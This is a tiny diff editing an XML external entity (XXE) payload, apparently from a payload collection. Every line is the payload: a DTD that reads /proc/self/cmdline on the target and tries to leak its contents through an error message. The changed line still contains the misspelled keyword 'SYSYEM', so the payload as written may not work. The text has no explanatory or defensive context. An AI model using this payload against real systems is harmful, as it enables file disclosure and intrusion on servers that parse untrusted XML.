@@ -1,4 +1,3 @@
 <!ENTITY % file SYSTEM "file:///proc/self/cmdline">
-<!ENTITY % eval "<!ENTITY 
-#x25; error SYSYEM 'file:///content: %file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSYEM 'file:///content: %file;'>">
 %eval;
